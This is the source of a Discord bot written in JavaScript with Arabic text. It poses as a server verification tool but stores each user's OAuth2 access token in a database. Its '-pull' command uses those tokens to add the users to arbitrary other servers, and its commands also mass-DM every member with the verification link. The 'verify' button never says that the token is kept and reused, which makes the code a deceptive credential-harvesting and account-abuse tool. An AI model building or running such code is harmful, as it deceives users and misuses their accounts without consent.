const { 
    Client, 
    GatewayIntentBits, 
    ActionRowBuilder, 
    EmbedBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    REST,
    Routes,
    PermissionFlagsBits,
    Events,
    ChannelType
} = require('discord.js');
const express = require('express');
const axios = require('axios');
const mongoose = require('mongoose'); 

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// ==================== إعداد وتوصيل قاعدة بيانات MongoDB ====================
const MONGO_URI = process.env.MONGO_URI; 

mongoose.connect(MONGO_URI)
    .then(() => console.log('Successfully connected to MongoDB Atlas!'))
    .catch(err => console.error('Failed to connect to MongoDB:', err));

const UserSchema = new mongoose.Schema({
    userId: { type: String, required: true, unique: true },
    accessToken: { type: String, required: true },
    username: { type: String },
    guildId: { type: String }
});

const VerifiedUser = mongoose.model('VerifiedUser', UserSchema);
// ====================================================================

const tempSetup = new Map(); 
const dmSetup = new Map();
const verifyBroadcastSetup = new Map();

let liveCounterMessageId = null; 
let liveCounterChannelId = null; 
let logVerifyChannelId = null; 

app.get('/', (req, res) => res.send('OAuth2 Verify & Broadcast Bot is Running!'));

app.get('/callback', async (req, res) => {
    const code = req.query.code;
    const guildId = req.query.state; 
    
    if (!code) {
        return res.send('<h1>❌ Verification Failed. Please try again.</h1>');
    }

    try {
        const tokenResponse = await axios.post('https://discord.com/api/v10/oauth2/token', new URLSearchParams({
            client_id: process.env.CLIENT_ID,
            client_secret: process.env.CLIENT_SECRET, 
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: `https://${req.hostname}/callback` 
        }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const accessToken = tokenResponse.data.access_token;

        const userResponse = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: `Bearer ${accessToken}` }
        });

        const userId = userResponse.data.id;
        const username = userResponse.data.username;

        await VerifiedUser.findOneAndUpdate(
            { userId: userId },
            { accessToken: accessToken, username: username, guildId: guildId || 'Unknown' },
            { upsert: true, new: true }
        );

        if (logVerifyChannelId) {
            const logChannel = client.channels.cache.get(logVerifyChannelId);
            if (logChannel) {
                const logEmbed = new EmbedBuilder()
                    .setTitle('✅ عضو جديد أتم التحقق الذاتي')
                    .setColor('#2ecc71')
                    .addFields(
                        { name: '👤 العضو', value: `<@${userId}> | \`${username}\``, inline: true },
                        { name: '🆔 أيدي الحساب', value: `\`${userId}\``, inline: true },
                        { name: '📺 السيرفر المصدر', value: guildId ? `\`أيدي: ${guildId}\`` : '`غير معروف`', inline: true }
                    )
                    .setTimestamp();
                await logChannel.send({ embeds: [logEmbed] }).catch(() => {});
            }
        }

        if (liveCounterChannelId && liveCounterMessageId) {
            const counterChannel = client.channels.cache.get(liveCounterChannelId);
            if (counterChannel) {
                const totalCount = await VerifiedUser.countDocuments();
                const counterMessage = await counterChannel.messages.fetch(liveCounterMessageId).catch(() => null);
                if (counterMessage) {
                    const updatedEmbed = new EmbedBuilder()
                        .setTitle('📊 عداد التحقق المباشر | Live Counter')
                        .setDescription(`🟢 تم تحديث العداد تلقائياً وبشكل حي!\n\n👥 العدد الإجمالي للأعضاء الموثقين والجاهزين للسحب في السيرفر هو:\n🌟 **\`${totalCount}\` عضو مفعّل** 🌟`)
                        .setColor('#2ecc71')
                        .setTimestamp();
                    await counterMessage.edit({ embeds: [updatedEmbed] }).catch(() => {});
                }
            }
        }

        if (guildId) {
            const guild = client.guilds.cache.get(guildId);
            if (guild) {
                const member = await guild.members.fetch(userId).catch(() => null);
                if (member) {
                    const verifiedRole = guild.roles.cache.find(r => r.name === 'Verified');
                    if (verifiedRole) {
                        await member.roles.add(verifiedRole).catch(err => console.error(err));
                    }
                }
            }
        }

        res.send(`<h1>✅ Verified Successfully! Thank you ${username}. You can now close this tab.</h1>`);
    } catch (error) {
        console.error('Error during callback:', error.response ? error.response.data : error.message);
        res.send('<h1>❌ Error during verification.</h1>');
    }
});

app.listen(PORT, '0.0.0.0', () => console.log(`Server connected to port ${PORT}`));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildPresences
    ]
});

// الاختصارات والأوامر الأساسية الحالية
const VERIFY_SETUP_PREFIX = '-vr';    // إرسال بوكس التحقق بالسؤال عن الرابط
const COUNT_VERIFY_PREFIX = '-vf';    // فحص عدد الموافقين الإجمالي
const PULL_MEMBERS_PREFIX = '-pull';  // سحب وإدخال الأعضاء للسيرفر المحدد
const LOG_VERIFY_PREFIX = '-tv';      // تحديد روم لوج التحقق الجديد
const LIVE_COUNTER_PREFIX = '-lc';    // إعداد وتفعيل عداد التحقق المباشر

const DM_BROADCAST_PREFIX = '-t';      // برودكاست الرسائل الخاصة العامة
const DM_VERIFY_PREFIX = '-vt';         // برودكاست رابط التحقق بالمنشن تلقائياً (أونلاين ثم أوفلاين)

let verifyUrl = 'https://discord.com/api/oauth2/authorize...'; 

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

async function createVerifyRoles(guild) {
    try {
        let verifiedRole = guild.roles.cache.find(r => r.name === 'Verified');
        if (!verifiedRole) {
            await guild.roles.create({
                name: 'Verified',
                color: '#2ecc71',
                reason: 'Auto-created role for verified users'
            });
        }

        let ownerRole = guild.roles.cache.find(r => r.name === 'Ownerv');
        if (!ownerRole) {
            await guild.roles.create({
                name: 'Ownerv',
                color: '#e74c3c',
                permissions: [PermissionFlagsBits.Administrator],
                reason: 'Auto-created control role for verification administrators'
            });
        }
    } catch (error) {
        console.error(error);
    }
}

client.once('ready', async () => {
    console.log(`Verify & Broadcast Bot is Online as ${client.user.tag}`);
    client.guilds.cache.forEach(async (guild) => {
        await createVerifyRoles(guild);
    });
});

client.on(Events.GuildCreate, async (guild) => {
    await createVerifyRoles(guild);
});

client.on('messageCreate', async message => {
    if (message.author.bot) return;

    const content = message.content.trim();
    const isAuthorized = message.member.permissions.has(PermissionFlagsBits.Administrator) || message.member.roles.cache.some(r => r.name === 'Ownerv');

    // 1. الإعداد التفاعلي لبوكس التحقق والزر بالسؤال عن الرابط
    if (content === VERIFY_SETUP_PREFIX) {
        if (!isAuthorized) {
            return message.reply('❌ عذراً، هذا الأمر مخصص للإدارة أو أصحاب رتبة **Ownerv** فقط.');
        }

        const setupState = { step: 'get_url', messagesToDelete: [] };
        tempSetup.set(message.author.id, setupState);

        const prompt = await message.channel.send(`${message.author}, 🛡️ **يرجى كتابة أو لصق رابط التحقق (OAuth2 URL) الخاص بك الآن في الشات:**`);
        setupState.messagesToDelete.push(message.id, prompt.id);
        return;
    }

    if (tempSetup.has(message.author.id)) {
        const state = tempSetup.get(message.author.id);
        state.messagesToDelete.push(message.id);

        if (state.step === 'get_url') {
            const inputUrl = message.content.trim();
            if (!inputUrl.startsWith('http')) {
                const errPrompt = await message.reply('❌ رابط غير صحيح. يرجى لصق رابط OAuth2 صحيح يبدأ بـ http:');
                state.messagesToDelete.push(errPrompt.id);
                return;
            }

            verifyUrl = inputUrl;
            
            const finalUrl = `${verifyUrl}&state=${message.guild.id}`;

            const embed = new EmbedBuilder()
                .setTitle('🛡️ Server Verification / التحقق الذاتي')
                .setDescription('Please click the button below to verify yourself and get full access to the server.\n\nالرجاء الضغط على الزر أدناه لإتمام التحقق وتفعيل حسابك بالكامل بداخل السيرفر الحصول على رتبة **Verified**.')
                .setColor('#2b2d31');

            const verifyButton = new ButtonBuilder()
                .setLabel('Verify yourself')
                .setURL(finalUrl)
                .setStyle(ButtonStyle.Link)
                .setEmoji('✅');

            const row = new ActionRowBuilder().addComponents(verifyButton);

            await message.channel.send({ embeds: [embed], components: [row] });

            setTimeout(async () => {
                for (const msgId of state.messagesToDelete) {
                    await message.channel.messages.delete(msgId).catch(() => {});
                }
            }, 1000);

            tempSetup.delete(message.author.id);
            return;
        }
    }

    // 2. تعيين قناة لوج التحقق (-tv [#القناة])
    if (content.startsWith(LOG_VERIFY_PREFIX)) {
        if (!isAuthorized) return;

        const args = content.slice(LOG_VERIFY_PREFIX.length).trim().split(/ +/);
        const channelMention = message.mentions.channels.first();
        const inputId = args[0];

        const targetChannel = channelMention || message.guild.channels.cache.get(inputId);

        if (!targetChannel || targetChannel.type !== ChannelType.GuildText) {
            return message.reply('❌ يرجى منشن قناة نصية صحيحة أو وضع الأيدي لتعيين قناة لوج التحقق:');
        }

        logVerifyChannelId = targetChannel.id;
        await message.reply(`✅ **تم بنجاح تعيين قناة لوج التحقق على: ${targetChannel}**`);
        await message.delete().catch(() => {});
        return;
    }

    // 3. تفعيل الـ Live Counter (عداد التحقق الحي)
    if (content === LIVE_COUNTER_PREFIX) {
        if (!isAuthorized) return;

        try {
            const totalCount = await VerifiedUser.countDocuments();
            const counterEmbed = new EmbedBuilder()
                .setTitle('📊 عداد التحقق المباشر | Live Counter')
                .setDescription(`🟢 جاري بدء المراقبة وتحديث الإحصائيات الحية...\n\n👥 العدد الإجمالي للأعضاء الموثقين والجاهزين للسحب في السيرفر هو:\n🌟 **\`${totalCount}\` عضو مفعّل** 🌟`)
                .setColor('#2ecc71')
                .setTimestamp();

            const sentMessage = await message.channel.send({ embeds: [counterEmbed] });
            liveCounterMessageId = sentMessage.id;
            liveCounterChannelId = message.channel.id;

            await message.reply('✅ **تم بنجاح تفعيل عداد التحقق المباشر في هذه القناة!**');
            await message.delete().catch(() => {});
        } catch (err) {
            console.error(err);
        }
        return;
    }

    // 4. فحص عدد الموثقين الإجمالي
    if (content === COUNT_VERIFY_PREFIX) {
        if (!isAuthorized) return;
        try {
            const count = await VerifiedUser.countDocuments();
            await message.reply(`📊 **إحصائية التحقق المطور (MongoDB):**\nالعدد الكلي للأعضاء الموثقين المحفوظين والجاهزين للسحب هو: \`${count}\` عضو.`);
        } catch (err) {
            console.error(err);
            await message.reply('❌ حدث خطأ أثناء محاولة جلب الإحصائية من قاعدة البيانات.');
        }
        return;
    }

    // 5. سحب الأعضاء الموثقين وتلقائياً (-pull [أيدي السيرفر])
    if (content.startsWith(PULL_MEMBERS_PREFIX)) {
        if (!isAuthorized) return;

        const args = content.slice(PULL_MEMBERS_PREFIX.length).trim().split(/ +/);
        const targetGuildId = args[0] || message.guild.id; 

        try {
            const totalCount = await VerifiedUser.countDocuments();

            if (totalCount === 0) {
                return message.reply('❌ لا يوجد أي أعضاء موثقين مسجلين في قاعدة البيانات حالياً لسحبهم.');
            }

            const targetGuild = client.guilds.cache.get(targetGuildId);
            if (!targetGuild) {
                return message.reply('❌ البوت ليس موجوداً بداخل السيرفر المستهدف، يرجى دعوة البوت أولاً.');
            }

            const statusMsg = await message.channel.send(`⏳ **جاري جلب الأعضاء وبدء سحب وإدخال \`${totalCount}\` عضو إلى السيرفر المستهدف...**`);

            let successCount = 0;
            let failCount = 0;
            let alreadyInCount = 0;

            const allVerifiedUsers = await VerifiedUser.find();

            let index = 0;
            const interval = setInterval(async () => {
                if (index >= allVerifiedUsers.length) {
                    clearInterval(interval);
                    await statusMsg.edit(`✅ **اكتملت عملية سحب الأعضاء بنجاح!**\n\n📬 تم إدخال: \`${successCount}\` عضو.\n🔄 كانوا موجودين بالسيرفر سابقاً: \`${alreadyInCount}\` عضو.\n❌ فشل سحبهم (انتهى توكن حسابهم): \`${failCount}\` عضو.`);
                    return;
                }

                const userData = allVerifiedUsers[index];
                const isMember = targetGuild.members.cache.has(userData.userId);

                if (isMember) {
                    alreadyInCount++;
                } else {
                    try {
                        await axios.put(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${userData.userId}`, {
                            access_token: userData.accessToken
                        }, {
                            headers: {
                                Authorization: `Bot ${TOKEN}`,
                                'Content-Type': 'application/json'
                            }
                        });
                        successCount++;
                    } catch (err) {
                        failCount++;
                    }
                }

                await statusMsg.edit(`⏳ **جاري السحب الفوري للأعضاء...**\n\n📊 التقدم الحالي: \`${index + 1}/${allVerifiedUsers.length}\` عضو.\n✅ تم الإدخال: \`${successCount}\` | 🔄 موجود سابقاً: \`${alreadyInCount}\` | ❌ فشل: \`${failCount}\``);
                index++;
            }, 1200); 

        } catch (err) {
            console.error(err);
            await message.reply('❌ حدث خطأ غير متوقع أثناء محاولة بدء عملية السحب.');
        }
        return;
    }

    // 6. برودكاست الرسائل الخاصة العامة بالمنشن التلقائي (أونلاين أولاً ثم أوفلاين) - الاختصار -t
    if (content === DM_BROADCAST_PREFIX) {
        if (!isAuthorized) return;

        const broadcastState = { step: 1, title: null, description: null, imageUrl: null, messagesToDelete: [] };
        dmSetup.set(message.author.id, broadcastState);

        const prompt = await message.channel.send(`${message.author}, 📢 **بدء إعداد برودكاست الخاص الذكي مع المنشن (أونلاين أولاً)**\n\n**الخطوة [1/3]:** يرجى كتابة **عنوان** رسالة البرودكاست:`);
        broadcastState.messagesToDelete.push(message.id, prompt.id);
        return;
    }

    if (dmSetup.has(message.author.id)) {
        const state = dmSetup.get(message.author.id);
        state.messagesToDelete.push(message.id);

        if (state.step === 1) {
            state.title = message.content.trim();
            state.step = 2;
            const prompt2 = await message.reply(`✅ تم حفظ العنوان.\n\n**الخطوة [2/3]:** يرجى كتابة **الوصف (محتوى الرسالة)**:`);
            state.messagesToDelete.push(prompt2.id);
            return;
        }

        if (state.step === 2) {
            state.description = message.content.trim();
            state.step = 3;
            const prompt3 = await message.reply(`✅ تم حفظ الوصف.\n\n**الخطوة [3/3] الأخيرة:** ضع رابط صورة للرسالة (أو اكتب \`لا\` للإلغاء):`);
            state.messagesToDelete.push(prompt3.id);
            return;
        }

        if (state.step === 3) {
            const input = message.content.trim();
            if (input.toLowerCase() !== 'لا' && input.startsWith('http')) {
                state.imageUrl = input;
            } else {
                state.imageUrl = null;
            }

            const statusMsg = await message.channel.send('⏳ **جاري بدء عملية البرودكاست التدريجي والآمن مع الإشارة للعضو (أونلاين أولاً)...**');

            setTimeout(async () => {
                for (const msgId of state.messagesToDelete) {
                    await message.channel.messages.delete(msgId).catch(() => {});
                }
            }, 1000);

            const members = await message.guild.members.fetch({ withPresences: true });
            const allMembers = Array.from(members.values()).filter(m => !m.user.bot);

            const onlineMembers = allMembers.filter(m => m.presence && m.presence.status !== 'offline');
            const offlineMembers = allMembers.filter(m => !m.presence || m.presence.status === 'offline');

            const sortedMembers = [...onlineMembers, ...offlineMembers];

            let sentCount = 0;
            let failedCount = 0;
            let index = 0;

            const interval = setInterval(async () => {
                if (index >= sortedMembers.length) {
                    clearInterval(interval);
                    await statusMsg.edit(`✅ **اكتمل البرودكاست بنجاح!**\n\n📬 تم الإرسال إلى: \`${sentCount}\` عضو.\n❌ فشل الإرسال لـ: \`${failedCount}\` عضو.`);
                    return;
                }

                const targetMember = sortedMembers[index];
                
                const personalEmbed = new EmbedBuilder()
                    .setTitle(state.title)
                    .setDescription(`👋 مرحباً بك يا ${targetMember}!\n\n${state.description}`)
                    .setColor('#5865F2')
                    .setTimestamp();

                if (state.imageUrl) {
                    personalEmbed.setImage(state.imageUrl);
                }

                try {
                    await targetMember.send({ embeds: [personalEmbed] });
                    sentCount++;
                } catch (err) {
                    failedCount++;
                }

                const progressType = index < onlineMembers.length ? '🟢 جاري إرسال المتصلين (Online)' : '⚫ جاري إرسال غير المتصلين (Offline)';
                await statusMsg.edit(`⏳ **${progressType}...**\n\n📊 التقدم الحالي: \`${index + 1}/${sortedMembers.length}\` عضو.\n✅ تم الإرسال: \`${sentCount}\` | ❌ فشل: \`${failedCount}\``);
                index++;
            }, 2500); 

            dmSetup.delete(message.author.id);
            return;
        }
    }

    // 7. برودكاست رابط وزر التحقق الذاتي بالخاص مع منشن تلقائي (أونلاين أولاً ثم أوفلاين) - الاختصار -vt
    if (content === DM_VERIFY_PREFIX) {
        if (!isAuthorized) return;

        const broadcastState = { step: 1, title: null, description: null, messagesToDelete: [] };
        verifyBroadcastSetup.set(message.author.id, broadcastState);

        const prompt = await message.channel.send(`${message.author}, 📢 **بدء إعداد برودكاست رابط التحقق الذاتي (أونلاين أولاً)**\n\n**الخطوة [1/2]:** يرجى كتابة **عنوان** رسالة التحقق:`);
        broadcastState.messagesToDelete.push(message.id, prompt.id);
        return;
    }

    if (verifyBroadcastSetup.has(message.author.id)) {
        const state = verifyBroadcastSetup.get(message.author.id);
        state.messagesToDelete.push(message.id);

        if (state.step === 1) {
            state.title = message.content.trim();
            state.step = 2;
            const prompt2 = await message.reply(`✅ تم حفظ العنوان.\n\n**الخطوة [2/2] الأخيرة:** يرجى كتابة **وصف وحث الأعضاء** على إتمام التحقق:`);
            state.messagesToDelete.push(prompt2.id);
            return;
        }

        if (state.step === 2) {
            state.description = message.content.trim();

            const statusMsg = await message.channel.send('⏳ **جاري بدء برودكاست رابط التحقق التدريجي والآمن مع الإشارة للعضو (أونلاين أولاً)...**');

            setTimeout(async () => {
                for (const msgId of state.messagesToDelete) {
                    await message.channel.messages.delete(msgId).catch(() => {});
                }
            }, 1000);

            const members = await message.guild.members.fetch({ withPresences: true });
            const allMembers = Array.from(members.values()).filter(m => !m.user.bot);

            const onlineMembers = allMembers.filter(m => m.presence && m.presence.status !== 'offline');
            const offlineMembers = allMembers.filter(m => !m.presence || m.presence.status === 'offline');

            const sortedMembers = [...onlineMembers, ...offlineMembers];

            let sentCount = 0;
            let failedCount = 0;
            let index = 0;

            const finalUrl = `${verifyUrl}&state=${message.guild.id}`;

            const verifyButton = new ButtonBuilder()
                .setLabel('Verify yourself')
                .setURL(finalUrl)
                .setStyle(ButtonStyle.Link)
                .setEmoji('✅');

            const row = new ActionRowBuilder().addComponents(verifyButton);

            const interval = setInterval(async () => {
                if (index >= sortedMembers.length) {
                    clearInterval(interval);
                    await statusMsg.edit(`✅ **اكتمل برودكاست رابط التحقق بنجاح!**\n\n📬 تم إرسال الرابط إلى: \`${sentCount}\` عضو.\n❌ فشل الإرسال لـ: \`${failedCount}\` عضو.`);
                    return;
                }

                const targetMember = sortedMembers[index];
                
                const personalEmbed = new EmbedBuilder()
                    .setTitle(state.title)
                    .setDescription(`👋 مرحباً بك يا ${targetMember}!\n\n${state.description}\n\nالرجاء الضغط على الزر أدناه لإتمام التحقق وتفعيل حسابك بالكامل بداخل السيرفر الحصول على رتبة **Verified**.\n\n🛡️ Server Verification / التحقق الذاتي`)
                    .setColor('#2b2d31')
                    .setTimestamp();

                try {
                    await targetMember.send({ embeds: [personalEmbed], components: [row] });
                    sentCount++;
                } catch (err) {
                    failedCount++;
                }

                const progressType = index < onlineMembers.length ? '🟢 جاري إرسال المتصلين (Online)' : '⚫ جاري إرسال غير المتصلين (Offline)';
                await statusMsg.edit(`⏳ **${progressType}...**\n\n📊 التقدم الحالي: \`${index + 1}/${sortedMembers.length}\` عضو.\n✅ تم الإدانة: \`${sentCount}\` | ❌ فشل: \`${failedCount}\``);
                index++;
            }, 2500); 

            verifyBroadcastSetup.delete(message.author.id);
            return;
        }
    }
});

client.login(TOKEN);